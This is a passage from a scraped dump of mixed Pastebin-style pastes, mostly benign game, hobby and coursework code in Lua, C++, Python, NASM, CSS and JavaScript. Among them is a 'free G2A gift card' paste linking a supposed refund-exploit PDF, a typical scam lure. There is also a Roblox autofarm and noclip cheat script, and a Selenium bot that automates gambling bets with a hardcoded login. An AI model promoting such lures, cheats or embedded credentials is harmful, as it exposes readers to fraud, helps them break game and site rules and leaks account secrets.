  return (int)(possiblePiece1s * rand() / 32768.0 * 0.9900001) | 0x10;
}

int getPiece2(Stages stage)
{
  int possiblePiece2Digs = 0;
  int possiblePiece2Enemies = 0;
  switch (stage)
  {
    case Stages.SpeedHighway:
      possiblePiece2Enemies = 0xC;
      break;
    case Stages.Casinopolis:
      possiblePiece2Enemies = 0x5;
      break;
    case Stages.RedMountain:
      possiblePiece2Digs = 0x6;
      possiblePiece2Enemies = 0x6;
      break;
    case Stages.SkyDeck:
      possiblePiece2Digs = 0x4;
      possiblePiece2Enemies = 0x8;
      break;
  }

  int piece2;
  if (stage == Stages.RedMountain || stage == Stages.SkyDeck)
  {
    piece2 = (int)((possiblePiece2Digs + possiblePiece2Enemies) * rand() / 32768.0 * 0.9900001);
    if (piece2 >= possiblePiece2Digs)
    {
      piece2 = (piece2 - possiblePiece2Digs) | 0x30;
    }
    else
    {
      piece2 |= 0x20;
    }
  }
  else
  {
    piece2 = (int)(possiblePiece2Enemies * rand() / 32768.0 * 0.9900001) | 0x30;
  }
  return piece2;
}

int getPiece3(Stages stage)
{
  int possiblePiece3s = 0;
  switch (stage)
  {
    case Stages.SpeedHighway:
      possiblePiece3s = 0x3;
      break;
    case Stages.Casinopolis:
      possiblePiece3s = 0x3;
      break;
    case Stages.RedMountain:
      possiblePiece3s = 0x3;
      break;
    case Stages.SkyDeck:
      possiblePiece3s = 0x6;
      break;
  }
  return (int)(possiblePiece3s * rand() / 32768.0 * 0.9900001) | 0x40;
}

enum Stages
{
  SpeedHighway,
  Casinopolis,
  RedMountain,
  SkyDeck
}

enum SpeedHighwayP1s
{
  BuildingAtEnd = 0x10,
  BuildingAtBegin = 0x11,
  RightSideAlley = 0x12,
  LeftSideAlley = 0x13,
  UnderAwning = 0x14,
  MiddleOfBuilding = 0x15
}

enum SpeedHighwayP2s
{
  YellowCanisterNearGreyBalcony = 0x30,
  GreyCanisterNearMiddleEntrance = 0x31,
  YellowCanisterNearMiddleBuilding = 0x32,
  GreyCanisterNearEnd = 0x33,
  YellowCanisterNearElectricEnemy = 0x34,
  GreyCanisterInAlcove = 0x35,
  ElectricSpinner = 0x36,
  BlackSpikeNearGreyBalcony = 0x37,
  BlackSpikeNearBuildingP1 = 0x38,
  Cop = 0x39,
  BlackSpikeMiddleBuilding = 0x3A,
  BlackSpikeIL = 0x3B
}

enum SpeedHighwayP3s
{
  GreyBalcony = 0x40,
  BalconyNearSpawn = 0x41,
  RedBalcony = 0x42
}"
GWzejEPU,craftify,AnonymusHochgenuss,Lua,Wednesday 24th of April 2024 12:17:05 PM CDT,"local tArgs = { ... }

function suckdropDirection()
 if input == ""top"" then
  turtle.dropUp()
 elseif input == ""bottom"" then
  turtle.dropDown()
 else
  turtle.drop()
 end
end

function suckDirection()
 if input == ""top"" then
  turtle.suckUp()
 elseif input == ""bottom"" then
  turtle.suckDown()
 else
  turtle.suck()
 end
end

function dropDirection()
 if output == ""top"" then
  turtle.dropUp()
 elseif output == ""bottom"" then
  turtle.dropDown()
 else
  turtle.drop()
 end
end

function drop()
 for i=5,12 do
  if turtle.getItemCount(i) > 0 then
   turtle.select(i)
   for e=2,4 do
    if turtle.compareTo(e) then
     turtle.select(e)
     suckdropDirection()
     turtle.select(i)
    end
   end
   suckdropDirection()
  end
 end
 for i=2,4 do
  if turtle.getItemCount(i) > 0 then
   turtle.select(i)
   dropDirection()
  end
 end
end

function pattern()
 if tArgs[2] == ""4"" then
  turtle.select(2)
  suckDirection()
  turtle.select(5)
  suckDirection()
  turtle.select(6)
  suckDirection()
  turtle.select(9)
  suckDirection()
 elseif tArgs[2] == ""8"" then
  turtle.select(2)
  suckDirection()
  turtle.select(3)
  suckDirection()
  turtle.select(5)
  suckDirection()
  turtle.select(6)
  suckDirection()
  turtle.select(7)
  suckDirection()
  turtle.select(9)
  suckDirection()
  turtle.select(10)
  suckDirection()
  turtle.select(11)
  suckDirection()
 end
end

if tArgs[1] == ""ee3"" then
 if not fs.exists(""ee3"") then
  shell.run(""clear"")
  print(""You ran this Program the first"")
  print(""Time on this Turtle. By default"")
  print(""this Turtle will Suck the Materials"")
  print(""from the Top and Drop it down."")
  print("""")
  write(""Press ENTER to Continue"")
  read()
  print("""")
  print(""You can Change this after first"")
  print(""start by editing the ee3 file."")
  print(""The first Line defines where it"")
  print(""comes from and the second Line"")
  print(""decides where it goes."")
  print("""")
  print(""Attention: the only accepted"")
  print(""Directions are top, front & bottom"")
  print(""Every other Entry will reset the File!"")
  print("""")
  write(""Press ENTER to Accept and Start"")
  read()
  file=fs.open(""ee3"",""w"")
  file.writeLine(""top"")
  file.writeLine(""bottom"")
  file.close()
  input=""top""
  ouput=""bottom""
 else
  file=fs.open(""ee3"",""r"")
  input=file.readLine()
  output=file.readLine()
  file.close()
  if not input then
   fs.delete(""ee3"")
   shell.run(""craftify ee3 ""..tArgs[2])
  end
  if not output then
   fs.delete(""ee3"")
   shell.run(""craftify ee3 ""..tArgs[2])
  end
  if not input == ""top"" then
   if not input == ""bottom"" then
    if not input == ""front"" then
     fs.delete(""ee3"")
     shell.run(""craftify ee3 ""..tArgs[2])
    end
   end
  end
  if not output == ""top"" then
   if not output == ""bottom"" then
    if not output == ""front"" then
     fs.delete(""ee3"")
     shell.run(""craftify ee3 ""..tArgs[2])
    end
   end
  end
 end
 shell.run(""clear"")
 print(""crafting with ""..tArgs[2].."" Items."")
 print(""input:  ""..input)
 print(""output: ""..output)
 drop()
 pattern()
 if tArgs[2] == ""4"" then
  q1=""2""
  q2=""6""
  q3=""9""
 else
  q1=""3""
  q2=""7""
  q3=""11""
 end
 for f=1,64 do
  turtle.select(4)
  turtle.craft()
  dropDirection()
  if f < 64 then
   for q = 2,q1 do
    while turtle.getItemCount(q) < 1 do
     drop()
     pattern()
    end
   end
   for q = 5,q2 do
    while turtle.getItemCount(q) < 1 do
     drop()
     pattern()
    end
   end
   for q = 9,q3 do
    while turtle.getItemCount(q) < 1 do
     drop()
     pattern()
    end
   end
  end
 end
 drop()
 shell.run(""craftify ee3 ""..tArgs[2])
end"
6sX3G2xa,mobfarm-materials,Combreal,GetText,Wednesday 24th of April 2024 12:12:19 PM CDT,"Mumbojumbo mob farm :
https://www.youtube.com/watch?v=YA2siTV5s4Q

BLOCKS : LOTS
DISPENSER : 60
REDSTONE : 350
REDTORCH : 40
WATER BUCKET : 60
HOPPER : 2
STICKY PISTON : 4

52 high (1+3+3+3+3+3+35+1)

Shulkercraft Iron golem farm :
https://youtu.be/xDJtXznj8Fg

42 - Building Block 
41 - Glass
26 - Wall
8 - Ladder
9 - Trapdoor
8 - Sign
5 - Hopper
4 - Repeater
3 - Composter
2 - Redstone dust 3- Bed
2 - Water Bucket
1 - Lava Bucket
1 - Chest
1 - Piston
1 - Redstone Torch 1 - Name Tag
64 - Temporary Block

(~15 height)
"
sLaMUfmS,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jusst2k4,GetText,Wednesday 24th of April 2024 12:05:19 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_575527.pdf

Working as of:
24 April 2024"
k2mL1pNB,Untitled,dllbridge,ASM (NASM),Wednesday 24th of April 2024 12:04:27 PM CDT,";  Специально для функции sort, чтобы упростить создание кода.
;                         В p адрес младшего из 2-х элементов
;////////////////////////////////////////////////////////////
proc    swap   p                                          ;//

        push esi
        push edi

       ; - - - - - - - - -
        mov  esi ,  [ p ]             ; Адрес 1-го торта
        mov  edi ,  [ p ]
        add  edi ,     4              ; Адрес 2-го торта
        mov  eax ,  [esi]             ; 1-й торт в левую руку   (в eax)

        cmp  eax ,  [edi]             ; Сравним 2 торта

        jle  L_01                     ; Если содержимое eax < ,то выходим

        mov  edx , [edi]              ; edx, как стол используем
        mov [esi],  edx
        mov [edi],  eax
        mov [ nF],    1               ; Флаг помнит про перестановку
        inc [nCount]                  ; Счётчик перестановок увеличиваем
       ; - - - - - - - - -

L_01:   pop  edi
        pop  esi
        ret
endp


               "
csvNEqNa,14,nq1s788,Python,Wednesday 24th of April 2024 11:59:44 AM CDT,"for x in range(19):
    sm = 7 * 19**7 + 8 * 19**6 + x * 19**5 + 7 * 19**4 + 9 * 19**3 + 6 * 19**2 + 4 * 19 + 3 + 2*19**4+5*19**3+x*19**2+4*19+3*1 + 6*19**3+3*19**2+x*19+5*1
    if sm % 18 == 0:
        print(sm // 18)"
cea43jX8,Untitled,sasha2483785,C++,Wednesday 24th of April 2024 11:59:05 AM CDT,"#include <iostream>
#include <string>
#include <Windows.h>
using namespace std;

int* dec2bin_no_ne_sovsem(int num, int& size);
int bin2dec_no_ne_sovsem(int size, int* arr);

int main() {
    int* arr = nullptr;
    int size;
    int n =1000;
    bool qwe = true;

    setlocale(LC_ALL, ""russian"");

  //главный цикл
    while (qwe) {
        cout << "" число: "" << n << endl;
        cout << ""бинарное представление: "";
        arr = dec2bin_no_ne_sovsem(n, size);
        for (int i = 0; i < size; i++) {
            cout << arr[i];
        }
        
        cout << endl;
        // Уменьшаем размер массива на один элемент
        int newSize = size - 1;
        int* newArr = new int[newSize];

        // Копируем все элементы из исходного массива, кроме последнего
        copy(arr, arr + newSize, newArr);
        // Освобождаем память, выделенную под новый массив
        delete[] newArr;
        size = newSize;
        cout << ""удалили последний элемент:  "";
        for (int i = 0; i < size; i++) {
            cout << arr[i];
        }
        cout << endl;
        cout << ""последнее число :"" << arr[size - 1] << endl;
        // Если число четное
        if (n%2 == 0) {
            // Увеличиваем размер массива на 2
            int newSize = size + 2;
            int* newArr = new int[newSize];

            // Копируем все элементы из исходного массива
            copy(arr, arr + size, newArr);

            // Добавляем в конец ""01""
            newArr[newSize - 2] = 0;
            newArr[newSize - 1] = 1;

            // Освобождаем память, выделенную под новый массив
            delete[] arr;
            arr = newArr;
            size = newSize;
            cout << ""добавили в конец 01:  "";
            for (int i = 0; i < size; i++) {
                cout << arr[i];
            }
            cout << endl;
        }

        // Если число нечетное
        else if (n%2 == 1) {
            // Увеличиваем размер массива на 2
            int newSize = size + 2;
            int* newArr = new int[newSize];

            // Копируем все элементы из исходного массива
            copy(arr, arr + size, newArr);

            // Добавляем в конец ""10""
            newArr[newSize - 2] = 1;
            newArr[newSize - 1] = 0;

            // Освобождаем память, выделенную под новый массив
            delete[] arr;
            arr = newArr;
            size = newSize;
            cout << ""добавили в конец 10:  "";
            for (int i = 0; i < size; i++) {
               cout << arr[i];
            }
            cout << endl;
        }
        cout << ""десятичное: "" << bin2dec_no_ne_sovsem(size, arr) << endl;
        if (bin2dec_no_ne_sovsem(size, arr) == 2018) {
            for (int i = 0; i < size - 1; i++) {
                cout << arr[i];
            }
            qwe = false;
        }
        n++;
       // Sleep(100);
    }
   
    delete[] arr;
   
    return 0;
}

int* dec2bin_no_ne_sovsem(int num, int& size) {
    int counter = 0;
    int temp = num;

    // Определяем размер массива
    while (temp > 0) {
        temp /= 2;
        counter++;
    }
    size = counter;

    // Выделяем память под массив
    int* arr = new int[counter];

    // Заполняем массив бинарным представлением числа
    for (int i = counter - 1; i >= 0; i--) {
        arr[i] = num % 2;
        num /= 2;
    }

    return arr;
}
int bin2dec_no_ne_sovsem(int size, int* arr) {
    int dec = 0;
    int k = 1;
    // Преобразование бинарного числа в десятичное
    for (int i = size-1; i >= 0; i--) {
        dec += arr[i] * k;
        k *= 2;
    }
   
    return dec;
}"
DXJMnAcj,mc_1&4_codes,FridayLord,Python,Wednesday 24th of April 2024 11:54:39 AM CDT,"//EXP 1 -> ONLINEGDB

import numpy as np
c1=[1,1,1,1]
c2=[1,-1,1,-1]
c3=[1,1,-1,-1]
c4=[1,-1,-1,1]
rc=[]
print(""Enter the data bits :"")
d1=int(input(""Enter D1 :""))
d2=int(input(""Enter D2 :""))
d3=int(input(""Enter D3 :""))
d4=int(input(""Enter D4 :""))
r1=np.multiply(c1,d1)
r2=np.multiply(c2,d2)
r3=np.multiply(c3,d3)
r4=np.multiply(c4,d4)
resultant_channel=r1+r2+r3+r4;
print(""Resultant Channel"",resultant_channel)
Channel=int(input(""Enter the station to listen for C1=1 ,C2=2, C3=3 C4=4 : ""))
if Channel==1:
    rc=c1
elif Channel==2:
    rc=c2
elif Channel==3:
    rc=c3
elif Channel==4:
    rc=c4
inner_product=np.multiply(resultant_channel,rc)
print(""Inner Product"",inner_product)
res1=sum(inner_product)
data=res1/len(inner_product)
print(""Data bit that was sent"",data)


//EXP 4 -> MATLAB

clear
N = 10^6 %number of bits
rand('state',100); 
randn('state',200); % initializing the randn() function
% Transmitter \
ip = rand(1,N)>0.5; % generating 0,1 with equal probability
s = 2*ip-1; % BPSK modulation 0 -> -1; 1 -> 1
n = 1/sqrt(2)*[randn(1,N) + j*randn(1,N)]; % white gaussian noise, 0dB

Eb_N0_dB = [-3:10]; % multiple Eb/N0 values
for ii = 1:length(Eb_N0_dB)
% Noise addition
y = s + 10^(-Eb_N0_dB(ii)/20)*n; % additive white gaussian noise
% receiver - hard decision decoding
ipHat = real(y)>0;
% counting the errors
nErr(ii) = size(find([ip- ipHat]),2);
end
simBer = nErr/N; % simulated ber
theoryBer = 0.5*erfc(sqrt(10.^(Eb_N0_dB/10))); % theoretical ber

% plot
close all
figure;
semilogy(Eb_N0_dB,theoryBer,'b.-');
hold on ;
semilogy(Eb_N0_dB,simBer,'mx-');
axis([-3 10 10^-5 0.5])
grid on;
legend('theory', 'simulation');
xlabel('Eb/No, dB');
ylabel('Bit Error Rate');
title('Bit error probability curve for BPSK modulation');

//other than this -> GOOGLE DRIVE LINK --> http://tiny.cc/fridaylordMC 
"
FrjjRD3w,Reha petfndng,suramraja1,Lua,Wednesday 24th of April 2024 11:23:11 AM CDT,"

coroutine.wrap(function()
    pcall(function()
        if game.PlaceId == 5589810303 then --Rh3Office
            repeat task.wait() until game:GetService(""Workspace"").CollectibleDiamonds:FindFirstChild(""Part"") == nil
            task.wait(10)
            game:GetService(""ReplicatedStorage"").SceptorTeleport:FireServer(""Lobby"")
        end
        if game.PlaceId == 735030788 then --Arrival Lobby
            repeat task.wait() until game:GetService(""Workspace"").CollectibleDiamonds:FindFirstChild(""Part"") == nil
            task.wait(10)
            game:GetService(""ReplicatedStorage"").SceptorTeleport:FireServer(""RH3Office"")
        end
    end)
end)()

coroutine.wrap(function() --pathfinder
    while task.wait() do
        pcall(function()
            local PathfindingService = game:GetService(""PathfindingService"")
            local human = game:GetService(""Players"").LocalPlayer.Character.Humanoid
            local torso = game.Players.LocalPlayer.Character.HumanoidRootPart

            local path = PathfindingService:CreatePath()
            path:ComputeAsync(torso.Position, workspace.CollectibleDiamonds.Part.Position)
            local waypoints = path:GetWaypoints()

            for i, waypoint in pairs(waypoints) do
                if waypoint.Action == Enum.PathWaypointAction.Jump then
                    human:ChangeState(Enum.HumanoidStateType.Jumping)
                end
                human:MoveTo(waypoint.Position)
                human.MoveToFinished:Wait(1)
            end

            human:MoveTo(game.Worksape.endingPart.Position)
        end)
    end
end)()

coroutine.wrap(function() --- anti sit
    firesignal(game:GetService(""Players"").LocalPlayer.PlayerGui.HUD.Run.MouseButton1Click) --run mode RH
    while task.wait() do
        if game:GetService(""Players"").LocalPlayer.Character.Humanoid.Sit == true then
            task.wait()
            game:GetService(""Players"").LocalPlayer.Character.Humanoid.Sit = false
        end
    end
end)()

coroutine.wrap(function()
    while true do
        for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
            if v:IsA(""BasePart"") and v.CanCollide == true then
                v.CanCollide = false
            end
        end
            game:GetService(""RunService"").Stepped:wait()
        end
end)()"
pBxnNpkS,mon.lua,Whiskee,Lua,Wednesday 24th of April 2024 11:19:41 AM CDT,"screen = peripheral.find(""monitor"")
station = peripheral.find(""Create_Station"")

term.redirect(screen)

while true do
    screen.clear()
    screen.setCursorPos(1,1)
    
    stationName = station.getStationName()
    isTrainPresent = station.isTrainPresent()
    isTrainImminent = station.isTrainImminent()
    isTrainEnroute = station.isTrainEnroute()
    trainName = isTrainPresent and station.getTrainName() or ""???""
    hasSchedule = isTrainPresent and station.hasSchedule() or ""???""

	if screen.isColor() then

	screen.setBackgroundColor(colors.black)

	    if isTrainPresent then screen.setBackgroundColor(colors.lime)
	    elseif isTrainImminent then screen.setBackgroundColor(colors.orange)
	    elseif isTrainEnroute then screen.setBackgroundColor(colors.lightBlue)
	    end

	end
            
    print(""stationName"", stationName)
    print(""isTrainPresent"", isTrainPresent)
    print(""isTrainImminent"", isTrainImminent)
    print(""isTrainEnroute"", isTrainEnroute)
    print(""trainName"", trainName)
    print(""hasSchedule"", hasSchedule)
     
    sleep() 
end
"
v7YJPAKe,python,coinwalk,JavaScript,Wednesday 24th of April 2024 11:14:47 AM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

import subprocess
import sys
import json
import time, re, math
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.firefox.service import Service
sys.setrecursionlimit(1000000000)
service = Service(executable_path=""/snap/bin/geckodriver"")
options = webdriver.FirefoxOptions()
options.add_argument(""--headless"")
driver = webdriver.Firefox(service=service, options=options)
print(""please wait loading page and login"")
driver.get(""https://just-dice.com"")
time.sleep(20)
driver.find_element(By.CSS_SELECTOR, ""a.fancybox-item.fancybox-close"").click()
time.sleep(5)
driver.find_element(By.LINK_TEXT, ""Account"").click()
time.sleep(2)
driver.find_element(By.ID, ""myuser"").clear()
driver.find_element(By.ID, ""myuser"").send_keys(""madman"")
time.sleep(0.01)
driver.find_element(By.ID, ""mypass"").clear()
driver.find_element(By.ID, ""mypass"").send_keys(""future2000"")
time.sleep(0.01)
driver.find_element(By.ID, ""myok"").click()
time.sleep(20)
print(""logged in"") 
original = float(driver.find_element(By.ID, ""pct_balance"").get_attribute(""value""))
love = 0.00001
nice = love
tens = (love * 10)
hundreds = (love * 100)
sevens = (love * 6.9)
eights = (love * 7.9)
snowie = 0
funny = False
lamb = 2
silvery = original
awesome = ((math.floor(original / tens)) * tens)
joke = 144000000
goldern = original
print(""should see bets"")

def go():
    global original
    global love
    global nice
    global tens
    global sevens
    global eights
    global snowie
    global funny
    global lamb
    global awesome
    global joke
    global goldern
    global silvery
    global hundreds
    belance = float(driver.find_element(By.ID, ""pct_balance"").get_attribute(""value""))
    coin = belance-original
    snow = round(coin, 8)
    bull = original-belance
    slob = round(bull, 8)
    if (snow>0):
        print(""profit"")
        print(snow)
    if (snow<=0):
        print(""profit"")
        print(0)
    if ((belance>(((math.floor(belance/tens))*tens)+sevens)) and (belance<(((math.floor(belance/tens))*tens)+eights)) and (not(belance==snowie))):
        nice = nice*2
        snowie = belance
    if (((belance-(nice*7))<=0) and (belance<=silvery) and (belance<(((math.floor(belance/tens))*tens)+sevens))):
        nice = love
        snowie = 0
        silevery = belance
    if (((belance-(nice*7))<=0) and (belance>=goldern) and (belance<(((math.floor(belance/tens))*tens)+sevens))):
        nice = love
        snowie = 0
        silevery = belance
        goldern = belance
    if (((original-(nice*7))<=0) and (belance<=silvery) and (belance<(((math.floor(belance/tens))*tens)+sevens))):
        nice = love
        snowie = 0
        silevery = belance
    if (((original-(nice*7))<=0) and (belance>=goldern) and (belance<(((math.floor(belance/tens))*tens)+sevens))):
        nice = love
        snowie = 0
        silevery = belance
        goldern = belance
    if (belance<silvery):
        silevery = belance
    if (belance>goldern):
        goldern = belance
    if (belance >= 0.24):
        print(""winner winner chicken dinner"")
        return
    time.sleep(0.1)
    number = float(nice)
    rounded_number = f""{number:.8f}""
    driver.find_element(By.ID, ""pct_chance"").clear()
    driver.find_element(By.ID, ""pct_chance"").send_keys(""49.5000"")
    driver.find_element(By.ID, ""pct_bet"").clear()
    driver.find_element(By.ID, ""pct_bet"").send_keys(rounded_number)
    driver.find_element(By.ID, ""a_lo"").click()
    time.sleep(0.8)
    go()
    
if (1==1):
    go()"
0Yfsjwj0,СПРИНТ № 7 | Односвязный список | Урок 2: Как устроен односвязный список,chevengur,C++,Wednesday 24th of April 2024 10:51:43 AM CDT,"#include <cassert>
#include <cstddef>
#include <string>
#include <utility>

template <typename Type>
class SingleLinkedList {
    // Узел списка
    struct Node {
        Node() = default;
        Node(const Type& val, Node* next)
            : value(val)
            , next_node(next) {
        }
        Type value;
        Node* next_node = nullptr;
    };

public:

    SingleLinkedList() : head_(), size_(0) {};
    
    // Возвращает количество элементов в списке за время O(1)
    [[nodiscard]] size_t GetSize() const noexcept {
        return size_;
    }

    // Сообщает, пустой ли список за время O(1)
    [[nodiscard]] bool IsEmpty() const noexcept {
        return (size_ == 0) ? true : false;
    }

private:
    // Фиктивный узел, используется для вставки ""перед первым элементом""
    Node head_;
    size_t size_;
};

void Test0() {
    using namespace std;
    {
        const SingleLinkedList<int> empty_int_list;
        assert(empty_int_list.GetSize() == 0u);
        assert(empty_int_list.IsEmpty());
    }

    {
        const SingleLinkedList<string> empty_string_list;
        assert(empty_string_list.GetSize() == 0u);
        assert(empty_string_list.IsEmpty());
    }
}

int main() {
    Test0();
}"
Y9qwLHhV,Tower of Hanoi,w31c0m32h311,Python,Wednesday 24th of April 2024 10:29:38 AM CDT,"    # Добавляем функцию для отображения окна с правилами
    def show_rules_screen(self):
        rules_screen = True
        while rules_screen:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    sys.exit()
                if event.type == pygame.MOUSEBUTTONDOWN:
                    rules_screen = False

            # Отображаем окно с правилами
            self.screen.fill(Color.yellow)
            self.blit_text('Правила игры:', (320, 100), font_name='sans serif', size=40, color=Color.black)
            self.blit_text('Ханойская башня - это головоломка, в которой необходимо', (320, 200), font_name='sans serif', size=24, color=Color.black)
            self.blit_text('переместить все диски с одной башни на другую, соблюдая', (320, 230), font_name='sans serif', size=24, color=Color.black)
            self.blit_text('правило: на больший диск нельзя класть меньший.', (320, 260), font_name='sans serif', size=24, color=Color.black)
            self.blit_text('Для перемещения используйте стрелки влево и вправо.', (320, 290), font_name='sans serif', size=24, color=Color.black)
            self.blit_text('Для взятия и опускания диска - стрелки вверх и вниз.', (320, 320), font_name='sans serif', size=24, color=Color.black)
            self.blit_text(' ', (320, 350), font_name='sans serif', size=24, color=Color.black)
            self.blit_text('Нажмите кнопку мыши, чтобы начать игру.', (320, 420), font_name='sans serif', size=32, color=Color.red)

            pygame.display.flip()
            self.clock.tick(60)"
8VEdKgN8,styles.css.txt FileExplorer,Arinek,CSS,Wednesday 24th of April 2024 10:11:02 AM CDT,".explorer-window {
    width: 800px;
    height: 100%;
    white-space: normal;
}

.explorer-path, .explorer-files-selected {
    min-height: 24px;
    margin: 10px 0;
    padding: 10px;
    border: 1px solid currentColor;
}

.explorer-dir-name, .explorer-file-name {
    width: 100%;
    text-align: center;
    display: block;
    overflow: auto;
    max-height: 22px;
    text-overflow: ellipsis;
    white-space: nowrap;
    font-family: ""Lucida Console"", ""Lucida Sans Unicode"", ""Fira Mono"", Consolas, ""Courier New"", Courier, monospace, ""Times New Roman"";
}

.explorer-directory, .explorer-file {
    width: calc(20% - 20px);
    margin: 10px;
    height: 160px;
    padding: 0;
    background-color: #272727;
    cursor: pointer;
}

.explorer-directory:hover,
.explorer-file:hover,
.explorer-directory.selected,
.explorer-file.selected {
    border: 1px solid currentColor;
    width: calc(20% - 22px);
    height: 158px;
}

.explorer-dir-image, .explorer-file-image {
    max-width: 80px;
    max-height: 80px;
    display: block;
    margin-left: auto;
    margin-right: auto;
}

.explorer-content {
    display: flex;
    justify-content: start;
    flex-wrap: wrap;
    height: 440px;
    overflow: scroll;
    border: 2px solid;
    width: calc(100% - 4px);
    white-space: pre-line;
}

.explorer-buttons {
    display: flex;
}

.explorer-buttons button {
    margin-right: 7px;
}

.explorer-back-link:hover {
    text-decoration: underline;
}

.explorer-back-link {
    cursor: pointer;
}"
jzfmChtK,index.html.txt FileExplorer,Arinek,HTML,Wednesday 24th of April 2024 10:09:48 AM CDT,"<div class='explorer-path'>${current_path}</div>
<div id=""explorer-content"" class=""explorer-content"">

	${loop: items=folders item=folder}
		<div class=""explorer-directory"" id=""${folder}"">
			<svg xmlns=""http://www.w3.org/2000/svg"" viewBox=""0 0 576 512""><
				<path fill=""currentColor"" d=""M88.7 223.8L0 375.8V96C0 60.7 28.7 32 64 32H181.5c17 0 33.3 6.7 45.3 18.7l26.5 26.5c12 12 28.3 18.7 45.3 18.7H416c35.3 0 64 28.7 64 64v32H144c-22.8 0-43.8 12.1-55.3 31.8zm27.6 16.1C122.1 230 132.6 224 144 224H544c11.5 0 22 6.1 27.7 16.1s5.7 22.2-.1 32.1l-112 192C453.9 474 443.4 480 432 480H32c-11.5 0-22-6.1-27.7-16.1s-5.7-22.2 .1-32.1l112-192z""/>
			</svg>
			<span class='explorer-dir-name'>${folder}</span>
		</div>
	${loop::}
	${loop: items=files item=file}
		<div class='explorer-file' id='${file}'>
			<svg class='primary-color explorer-file-image' xmlns=""http://www.w3.org/2000/svg"" viewBox=""0 0 384 512"">
				<path fill=""currentColor"" d=""M369.9 97.9L286 14C277 5 264.8-.1 252.1-.1H48C21.5 0 0 21.5 0 48v416c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V131.9c0-12.7-5.1-25-14.1-34zM332.1 128H256V51.9l76.1 76.1zM48 464V48h160v104c0 13.3 10.7 24 24 24h104v288H48z""/>
			</svg>
			<span class='explorer-file-name'>${file}</span>
		</div>
	${loop::}
</div>
<div class='explorer-files-selected' id='explorer-files-selected'>
    <p>${loop: items=selected_files item=file}${file}, ${loop::}</p>
</div>
<div class='explorer-buttons'>
    <button id='explorer-remove' class='css-18nrgbo'>remove</button>
    <button id='explorer-open' class='css-18nrgbo'>open files</button>
</div>"
gvMDFQgf,Collection,Arinek,JavaScript,Wednesday 24th of April 2024 10:08:23 AM CDT,"export class Collection {
	data;

	constructor(){
		this.data = {};
	}

	get data(){
		return this.data
	}

	get single(){
		let singles = {};
		for(const item of Object.keys(this.data)){
			if(typeof item !== ""object""){
				singles[item] = this.data[item];
			}
		}
		return singles;
	}

	add(key, value){
		this.data[key] = value;
	}
}"
i7hCkKkj,ArinekHTML Parser,Arinek,JavaScript,Wednesday 24th of April 2024 10:07:47 AM CDT,"export class ArinekHTML {
	#raw_html;
	html;
	#ns;

	keywords = [
		""loop""
	];

	/**
	 * @param {NS} ns
	 * @param {string} html_file
	 */
	constructor(ns, html_file) {
		this.#raw_html = ns.read(html_file);
		this.#ns = ns;
	}

	/**
	 * @param {Collection} data
	 */
	parse(data) {
		this.html = this.#raw_html;

		while (this.commands.length !== 0) {
			let commands = this.commands;

			//Validating Commands.
			const invalid_commands = this.validateCommands(commands, this.keywords);
			commands = commands.filter(command => invalid_commands.every(invalid_command => invalid_command.command !== command.command));


			let command_pairs = []

			for (const command of commands) {
				if (command.depth === 0) {
					command_pairs.push(command);
				}
			}

			let new_html = """";
			let prev_end_index = 0;
			for (let index = 0; index < command_pairs.length; index += 2) {
				const open_command = command_pairs[index];
				const close_command = command_pairs[index + 1];

				const open_command_end_index = open_command.index + open_command.command.length + 3;
				const close_command_end_index = close_command.index + close_command.command.length + 3;

				const content = this.html.slice(open_command_end_index, close_command.index);

				//this.#ns.tprint(open_command.command, this.html[open_command.index]);

				let args = open_command.command.split("":"")[1].split("" "");

				for (let arg in args) {
					args[arg] = new Arg(open_command, args[arg].split(""="")[0], args[arg].split(""="")[1]);
				}
				const result = open_command.run(args, content, data, this.#ns);

				new_html += this.html.slice(prev_end_index, open_command.index) + result;
				prev_end_index = close_command_end_index;
			}
			new_html += this.html.slice(prev_end_index);
			this.html = new_html;
			//this.#ns.tprint(this.html);
		}
		for (const item in data.single) {
			this.html = this.html.replaceAll(item, data[item]);
		}
	}

	/**
	 * @returns {Command[]}
	 */
	get commands() {
		let commands = [];
		const html = this.html; //Shortened name.
		let index = -1; //Index in html file.
		let depth = -1; //Depth of command in command structure.
		//this.#ns.tprint(""\n"");

		//While there is another command.
		while (html.indexOf(""${"", index + 1) !== -1) {
			index = html.indexOf(""${"", index + 1);
			const end_of_command_index = html.indexOf(""}"", index);

			const command = html.slice(index + 2, end_of_command_index); //Command sliced from html from ""${blablabla}"" to ""blablabla"".
			//this.#ns.tprint(index + "" "", html[index]);


			//Checking whether it is a command and not a variable.
			if (new RegExp("".*:.*"").test(command)) {

				//Checking whether or not it is a closing statement, as such ending in two "":"".
				if (new RegExp("".*::"").test(command)) {
					const commandObject = new Command(command, depth, index);
					commands.push(commandObject);
					depth -= 1;
				}
				else {
					depth += 1;
					const commandObject = new Command(command, depth, index);
					commands.push(commandObject);
				}
			}
		}
		//this.#ns.tprint(html);
		return commands;
	}

	/**
	 * @param {Command[]} commands
	 * @param {string[]} keywords
	 * @returns {Command[]?}
	 */
	validateCommands(commands, keywords) {
		let invalid_commands = [];
		for (const command of commands) {
			if (!keywords.some(keyword => keyword == command.name) && !new RegExp("".*:.*"").test(command.command)) {
				invalid_commands.push(command);
			}
		}
		return invalid_commands;
	}
}

class Command {
	#command;
	#name;
	#depth;
	#index;

	/**
	 * @param {string} command
	 * @param {number} depth
	 * @param {number} index
	 */
	constructor(command, depth, index) {
		this.#command = command;
		this.#name = command.split("":"")[0];
		this.#depth = depth;
		this.#index = index;
	}

	get command() {
		return this.#command;
	}

	get name() {
		return this.#name;
	}

	get depth() {
		return this.#depth;
	}

	get index() {
		return this.#index;
	}

	/**
	 * @param {Arg[]} args
	 * @param {string} content
	 * @param {Collection} data
	 * @param {NS} ns
	 */
	run(args, content, data, ns) {
		switch (this.#name.toUpperCase()) {
